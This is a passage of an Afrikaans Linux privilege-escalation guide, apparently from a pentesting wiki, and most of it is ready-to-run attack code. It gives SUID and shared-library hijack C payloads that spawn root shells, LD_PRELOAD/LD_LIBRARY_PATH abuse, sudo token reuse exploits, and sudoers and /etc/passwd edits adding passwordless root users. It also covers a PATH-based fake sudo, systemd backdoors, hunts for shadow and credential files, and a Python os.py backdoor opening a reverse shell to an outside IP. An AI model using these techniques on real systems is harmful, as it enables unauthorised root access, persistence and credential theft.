Indien die **suid** binary **nog ’n command uitvoer terwyl die path gespesifiseer word**, kan jy probeer om ’n **function** te **export** wat na die command genoem is wat die suid-lêer uitvoer.

Byvoorbeeld, indien ’n suid binary _**/usr/sbin/service apache2 start**_ oproep, moet jy probeer om die function te skep en dit te export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dan, wanneer jy die suid binary aanroep, sal hierdie funksie uitgevoer word

### Writable script executed by a SUID wrapper

’n Algemene custom-app-miskonfigurasie is ’n root-owned SUID binary wrapper wat ’n script uitvoer, terwyl die script self deur lae-bevoorregte gebruikers geskryf kan word.

Tipiese patroon:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
As `/usr/local/bin/backup.sh` skryfbaar is, kan jy payload-opdragte aanheg en dan die SUID-wrapper uitvoer:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Vinnige kontroles:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Hierdie attack path is veral algemeen in "maintenance"/"backup" wrappers wat in `/usr/local/bin` gelewer word.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die **LD_PRELOAD**-omgewingsveranderlike word gebruik om een of meer shared libraries (.so-lêers) te spesifiseer wat deur die loader vóór alle ander libraries gelaai moet word, insluitend die standaard C library (`libc.so`). Hierdie proses staan bekend as preloading van ’n library.

Om egter stelselsekuriteit te handhaaf en te voorkom dat hierdie funksie uitgebuit word, veral met **suid/sgid**-executables, dwing die stelsel sekere voorwaardes af:

- Die loader ignoreer **LD_PRELOAD** vir executables waar die werklike gebruikers-ID (_ruid_) nie met die effektiewe gebruikers-ID (_euid_) ooreenstem nie.
- Vir executables met suid/sgid word slegs libraries in standard paths wat ook suid/sgid is, gepreload.

Privilege escalation kan plaasvind as jy die vermoë het om commands met `sudo` uit te voer en die uitvoer van `sudo -l` die stelling **env_keep+=LD_PRELOAD** bevat. Hierdie konfigurasie laat die **LD_PRELOAD**-omgewingsveranderlike voortbestaan en herken word selfs wanneer commands met `sudo` uitgevoer word, wat moontlik tot die uitvoering van arbitrary code met verhoogde privileges kan lei.<sup>[[9]](#references)</sup>
```
Defaults        env_keep += LD_PRELOAD
```
Stoor as **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kompileer dit dan met:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Laastens, **escalate privileges** deur te hardloop
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> ’n Soortgelyke privesc kan uitgebuit word indien die aanvaller die **LD_LIBRARY_PATH**-env-veranderlike beheer, omdat hy die path beheer waar libraries gesoek sal word.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wanneer jy ’n binary met **SUID**-permissies teëkom wat ongewoon lyk, is dit goeie praktyk om te verifieer of dit **.so**-lêers korrek laai. Dit kan nagegaan word deur die volgende command uit te voer:<sup>[[17]](#references)</sup>
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Byvoorbeeld, wanneer ’n fout soos _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ teëgekom word, dui dit op ’n moontlike geleentheid vir exploitation.

Om dit te exploiteer, skep ’n mens ’n C-lêer, byvoorbeeld _"/path/to/.config/libcalc.c"_, wat die volgende code bevat:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hierdie kode, sodra dit gekompileer en uitgevoer is, poog om voorregte te verhoog deur lêertoestemmings te manipuleer en ’n shell met verhoogde voorregte uit te voer.

Kompileer die bogenoemde C-lêer in ’n shared object (.so)-lêer met:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Uiteindelik behoort die uitvoer van die geaffekteerde SUID-binary die exploit te aktiveer, wat moontlike stelselkompromittering toelaat.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Noudat ons ’n SUID-binary gevind het wat ’n library laai vanaf ’n folder waarin ons kan skryf, laat ons die library in daardie folder met die nodige naam skep:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
As jy ’n fout kry soos
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
dit beteken dat die library wat jy gegenereer het, ’n funksie genaamd `a_function_name` moet hê.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is ’n saamgestelde lys van Unix binaries wat deur ’n aanvaller uitgebuit kan word om plaaslike sekuriteitsbeperkings te omseil. [**GTFOArgs**](https://gtfoargs.github.io/) is dieselfde, maar vir gevalle waar jy **slegs arguments kan inject** in ’n command.

Die projek versamel legitieme funksies van Unix binaries wat misbruik kan word om uit beperkte shells te ontsnap, privileges te eskaleer of te behou, files oor te dra, bind- en reverse shells te spawn, en ander post-exploitation-take te fasiliteer.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

As jy toegang tot `sudo -l` het, kan jy die tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) gebruik om te kyk of dit vind hoe enige sudo-reël uitgebuit kan word.

### Hergebruik van Sudo Tokens

In gevalle waar jy **sudo access** het, maar nie die password nie, kan jy privileges eskaleer deur **vir ’n sudo command execution te wag en dan die session token te hijack**.<sup>[[18]](#references)</sup>

Vereistes om privileges te eskaleer:

- Jy het reeds ’n shell as user "_sampleuser_"
- "_sampleuser_" het **`sudo` gebruik** om iets in die **laaste 15 minute** uit te voer (dit is by verstek die duur van die sudo token wat ons toelaat om `sudo` te gebruik sonder om enige password in te voer)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (jy moet dit kan upload)

(Jy kan `ptrace_scope` tydelik enable met `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`, of dit permanent wysig in `/etc/sysctl.d/10-ptrace.conf` en `kernel.yama.ptrace_scope = 0` stel)

As aan al hierdie vereistes voldoen word, **kan jy privileges eskaleer deur:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject) te gebruik

- Die **eerste exploit** (`exploit.sh`) sal die binary `activate_sudo_token` in _/tmp_ skep. Jy kan dit gebruik om die sudo token in jou session te **aktiveer** (jy sal nie outomaties ’n root shell kry nie; doen `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Die **tweede exploit** (`exploit_v2.sh`) sal ’n sh shell in _/tmp_ skep wat **deur root besit word met setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Die **third exploit** (`exploit_v3.sh`) sal **'n sudoers-lêer skep** wat **sudo tokens ewigdurend maak en alle gebruikers toelaat om sudo te gebruik**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

As jy **skryftoestemmings** in die gids of op enige van die geskepte lêers binne die gids het, kan jy die binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) gebruik om **’n sudo token vir ’n gebruiker en PID te skep**.\
Byvoorbeeld, as jy die lêer _/var/run/sudo/ts/sampleuser_ kan oorskryf en jy het ’n shell as daardie gebruiker met PID 1234, kan jy **sudo privileges verkry** sonder om die wagwoord te hoef te ken deur die volgende te doen:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die lêer `/etc/sudoers` en die lêers binne `/etc/sudoers.d` stel op wie `sudo` kan gebruik en hoe. Hierdie lêers **kan by verstek slegs deur gebruiker root en groep root gelees word**.\
**As** jy hierdie lêer kan **lees**, kan jy moontlik **interessante inligting bekom**, en as jy enige lêer kan **skryf**, sal jy **voorregte kan eskaleer**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
As jy kan skryf, kan jy hierdie toestemming misbruik.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Nog ’n manier om hierdie toestemmings te misbruik:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Daar is alternatiewe vir die `sudo`-binary, soos `doas` vir OpenBSD; onthou om die konfigurasie daarvan by `/etc/doas.conf` na te gaan.
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
As `doas` ’n editor of interpreter toelaat, kyk na GTFOBins-styl escapes:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

As jy weet dat ’n **user gewoonlik aan ’n machine koppel en `sudo` gebruik** om privileges te eskaleer en jy ’n shell binne daardie user context verkry het, kan jy ’n **nuwe sudo executable skep** wat jou code as root sal uitvoer en daarna die user se command. Vervolgens, **wysig die $PATH** van die user context (byvoorbeeld deur die nuwe path in .bash_profile by te voeg) sodat jou sudo executable uitgevoer word wanneer die user sudo uitvoer.

Let daarop dat as die user ’n ander shell gebruik (nie bash nie), jy ander lêers sal moet wysig om die nuwe path by te voeg. Byvoorbeeld, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) wysig `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Jy kan nog ’n voorbeeld in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) vind.

Of deur iets soos die volgende uit te voer:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Gedeelde Biblioteek

### ld.so

Die lêer `/etc/ld.so.conf` dui aan **waar die gelaaide konfigurasielêers vandaan kom**. Tipies bevat hierdie lêer die volgende pad: `include /etc/ld.so.conf.d/*.conf`

Dit beteken dat die konfigurasielêers vanaf `/etc/ld.so.conf.d/*.conf` gelees sal word. Hierdie konfigurasielêers **wys na ander vouers** waar daar na **libraries** gesoek gaan word. Byvoorbeeld, die inhoud van `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **Dit beteken dat die stelsel binne `/usr/local/lib` na libraries sal soek**.

As **'n gebruiker skryftoestemmings** het op enige van die aangeduide paaie: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, enige lêer binne `/etc/ld.so.conf.d/` of enige vouer binne die konfigurasielêer in `/etc/ld.so.conf.d/*.conf`, kan hy moontlik privileges eskaleer.\
Kyk na **hoe om hierdie misconfiguration te exploit** op die volgende bladsy:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Deur die lib na `/var/tmp/flag15/` te kopieer, sal dit deur die program op hierdie plek gebruik word, soos in die `RPATH`-veranderlike gespesifiseer.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Skep dan ’n kwaadwillige biblioteek in `/var/tmp` met `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities verskaf ’n **subset van die beskikbare root-voorregte aan ’n proses**. Dit breek root se **voorregte effektief op in kleiner en onderskeibare eenhede**. Elkeen van hierdie eenhede kan dan onafhanklik aan prosesse toegeken word. Op hierdie manier word die volledige stel voorregte verminder, wat die risiko’s van exploitation verlaag.\
Lees die volgende bladsy om **meer te leer oor capabilities en hoe om dit te abuse**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Gidspermissies

In ’n gids impliseer die **bit vir "execute"** dat die betrokke gebruiker "**cd**" na die gids kan uitvoer.\
Die **"read"**-bit impliseer dat die gebruiker die **lêers** kan **lys**, en die **"write"**-bit impliseer dat die gebruiker nuwe **lêers** kan **verwyder** en **skep**.

## ACLs

Access Control Lists (ACLs) verteenwoordig die sekondêre laag van discretionary permissions, wat die vermoë het om die **tradisionele ugo/rwx-permissies te override**. Hierdie permissies verbeter beheer oor toegang tot lêers of gidse deur regte aan spesifieke gebruikers wat nie die eienaars is of deel van die groep is nie, toe te laat of te weier. Hierdie vlak van **granulariteit verseker meer presiese toegangsbestuur**. Verdere besonderhede kan [**hier**](https://linuxconfig.org/how-to-manage-acls-on-linux) gevind word.<sup>[[19]](#references)</sup>

**Gee** gebruiker "kali" lees- en skryftoestemmings oor ’n lêer:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Kry** lêers met spesifieke ACL'e van die stelsel af:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Versteekte ACL-backdoor in sudoers drop-ins

'n Algemene verkeerde konfigurasie is 'n lêer wat deur root besit word in `/etc/sudoers.d/` met modus `440` wat steeds skryftoegang aan 'n gebruiker met lae voorregte via ACL verleen.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
As jy iets soos `user:alice:rw-` sien, kan die gebruiker ’n sudo-reël aanheg ondanks beperkende modus-bisse:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Hierdie is ’n hoë-impak ACL persistence/privesc-pad omdat dit maklik is om tydens resensies wat slegs op `ls -l` gebaseer is, mis te kyk.

## Oop shell-sessies

In **ou weergawes** mag jy moontlik ’n ander gebruiker (**root**) se **shell**-sessie **hijack**.\
In **nuutste weergawes** sal jy slegs aan screen-sessies van **jou eie gebruiker** kan **connect**. Jy kan egter **interessante inligting binne die sessie** vind.

### screen-sessies hijacking

**Lys screen-sessies**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Socket-liggings (sommige stelsels stel een as 'n simlink van die ander bloot): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Heg aan 'n sessie**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dit was ’n probleem met **ou tmux-weergawes**. Ek kon nie ’n tmux (v2.1)-sessie wat deur root geskep is, as ’n gebruiker sonder bevoorregte toegang kaap nie.

**Lys tmux-sessies**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket-liggings (sommige stelsels stel een bloot as 'n symlink van die ander) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Lys met daardie socket, jy kan 'n tmux-sessie in daardie socket begin...](<../../images/image (837).png>)

**Koppel aan 'n sessie**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Kyk na **Valentine box from HTB** vir ’n voorbeeld.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- en SSH-keys wat tussen September 2006 en 13 Mei 2008 op Debian-gebaseerde stelsels (Ubuntu, Kubuntu, ens.) gegenereer is, kan deur hierdie bug geraak word.\
Hierdie bug word veroorsaak wanneer ’n nuwe ssh-key in daardie OS geskep word, aangesien **slegs 32 768 variasies moontlik was**. Dit beteken dat al die moontlikhede bereken kan word en **dat jy, met die ssh public key, vir die ooreenstemmende private key kan soek**. Jy kan die berekende moontlikhede hier vind: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Interessante SSH-konfigurasiewaardes

- **PasswordAuthentication:** Spesifiseer of password authentication toegelaat word. Die verstek is `no`.
- **PubkeyAuthentication:** Spesifiseer of public key authentication toegelaat word. Die verstek is `yes`.
- **PermitEmptyPasswords**: Wanneer password authentication toegelaat word, spesifiseer dit of die server login tot accounts met leë password strings toelaat. Die verstek is `no`.

### Login-beheerlêers

Hierdie lêers beïnvloed wie kan login en hoe:

- **`/etc/nologin`**: indien dit bestaan, blokkeer dit non-root logins en vertoon dit sy boodskap.
- **`/etc/securetty`**: beperk waar root kan login (TTY-allowlist).
- **`/etc/motd`**: post-login-banner (kan environment- of maintenance-details lek).

### PermitRootLogin

Spesifiseer of root met ssh kan login; die verstek is `no`. Moontlike waardes:

- `yes`: root kan met ’n password en private key login
- `without-password` of `prohibit-password`: root kan slegs met ’n private key login
- `forced-commands-only`: Root kan slegs met ’n private key login en indien die commands options gespesifiseer is
- `no` : geen

### AuthorizedKeysFile

Spesifiseer lêers wat die public keys bevat wat vir user authentication gebruik kan word. Dit kan tokens soos `%h` bevat, wat deur die home directory vervang sal word. **Jy kan absolute paths aandui** (wat met `/` begin) of **relatiewe paths vanaf die user se home**. Byvoorbeeld:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Daardie konfigurasie sal aandui dat, indien jy probeer aanmeld met die **private** key van die gebruiker "**testusername**", ssh die public key van jou key gaan vergelyk met dié wat in `/home/testusername/.ssh/authorized_keys` en `/home/testusername/access` geleë is.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding laat jou toe om jou **local SSH keys te gebruik in plaas daarvan om keys** (sonder passphrases!) op jou server te laat lê. Jy sal dus via ssh kan **jump** **na ’n host** en van daar af **na ’n ander** host **jump**, **met gebruik van** die **key** wat op jou **initial host** geleë is.

Jy moet hierdie opsie in `$HOME/.ssh.config` stel soos volg:
```
Host example.com
ForwardAgent yes
```
Let daarop dat indien `Host` elke keer `*` is wanneer die gebruiker na ’n ander masjien oorskakel, daardie host toegang tot die sleutels sal hê (wat ’n sekuriteitskwessie is).

Die lêer `/etc/ssh_config` kan hierdie **opsies** **oorheers** en hierdie konfigurasie toelaat of weier.\
Die lêer `/etc/sshd_config` kan ssh-agent forwarding toelaat of weier met die sleutelwoord `AllowAgentForwarding` (die verstek is toelaat).

Indien jy vind dat Forward Agent in ’n omgewing gekonfigureer is, lees die volgende bladsy, aangesien jy dit moontlik kan **misbruik om voorregte te eskaleer**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profielleêers

Die lêer `/etc/profile` en die lêers onder `/etc/profile.d/` is **scripts wat uitgevoer word wanneer ’n gebruiker ’n nuwe shell begin**. Daarom, indien jy **enige van hulle kan skryf of wysig, kan jy voorregte eskaleer**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Indien enige vreemde profielskrip gevind word, moet jy dit nagaan vir **sensitiewe besonderhede**.

### Passwd/Shadow-lêers

Afhangend van die OS kan die `/etc/passwd`- en `/etc/shadow`-lêers ’n ander naam gebruik, of daar kan ’n rugsteun wees. Daarom word dit aanbeveel om **almal te vind** en **te kontroleer of jy dit kan lees** om te sien **of daar hashes** binne die lêers is:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In sommige gevalle kan jy **password hashes** binne die `/etc/passwd` (of ekwivalente) lêer vind
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Skryfbare /etc/passwd

Genereer eers ’n wagwoord met een van die volgende opdragte.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Voeg dan die gebruiker `hacker` by en voeg die gegenereerde wagwoord by.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Byvoorbeeld: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Jy kan nou die `su`-opdrag met `hacker:hacker` gebruik

Alternatiewelik kan jy die volgende reëls gebruik om ’n dummy-gebruiker sonder ’n wagwoord by te voeg.\
WAARSKUWING: jy kan die huidige sekuriteit van die masjien verswak.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
LET WEL: Op BSD-platforms is `/etc/passwd` geleë by `/etc/pwd.db` en `/etc/master.passwd`, en `/etc/shadow` is ook hernoem na `/etc/spwd.db`.

Jy moet nagaan of jy **in sommige sensitiewe lêers kan skryf**. Kan jy byvoorbeeld na ’n **dienskonfigurasielêer skryf**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Byvoorbeeld, indien die masjien ’n **tomcat**-bediener gebruik en jy die **Tomcat-dienskonfigurasielêer binne /etc/systemd/ kan wysig,** kan jy die lyne wysig:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Jou backdoor sal uitgevoer word die volgende keer wanneer tomcat gestart word.

### Kontroleer vouers

Die volgende vouers kan rugsteunkopieë of interessante inligting bevat: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Jy sal waarskynlik nie die laaste een kan lees nie, maar probeer).
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Vreemde ligging/lêers met vreemde eienaars
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Gewysigde lêers in die afgelope minute
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-lêers
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml-lêers
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteekte lêers
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binaries in PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Weblêers**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rugsteunkopieë**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekende lêers wat wagwoorde bevat

Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); dit soek na **verskeie moontlike lêers wat wagwoorde kan bevat**.\
**Nog ’n interessante hulpmiddel** wat jy hiervoor kan gebruik, is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), wat ’n oopbrontoepassing is wat gebruik word om baie wagwoorde te herwin wat op ’n plaaslike rekenaar vir Windows, Linux en Mac gestoor is.

### Logs

As jy logs kan lees, kan jy moontlik **interessante/vertroulike inligting daarin vind**. Hoe vreemder die log is, hoe interessanter sal dit (waarskynlik) wees.\
Daarbenewens kan sommige "**sleg**" gekonfigureerde (met ’n backdoor?) **audit logs** jou moontlik toelaat om **wagwoorde in audit logs aan te teken**, soos in hierdie plasing verduidelik word: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Om **logs te lees, sal die groep** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) baie nuttig wees.

### Shell-lêers
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Jy moet ook kyk vir lêers wat die woord "**password**" in hul **naam** of binne die **inhoud** bevat, en ook kyk vir IP's en e-posadresse binne logs, of hash-regexps.\
Ek gaan nie hier lys hoe om al hierdie dinge te doen nie, maar as jy belangstel, kan jy die laaste kontroles nagaan wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer.

## Skryfbare lêers

### Python library hijacking

As jy weet **waarvandaan** 'n python-script uitgevoer gaan word en jy **binne daardie vouer kan skryf**, of jy **python libraries kan wysig**, kan jy die OS library wysig en 'n backdoor daarin plaas (as jy kan skryf waar die python-script uitgevoer gaan word, kopieer en plak die os.py library).

Om **die library van 'n backdoor te voorsien**, voeg jy eenvoudig die volgende reël aan die einde van die os.py library by (verander IP en PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

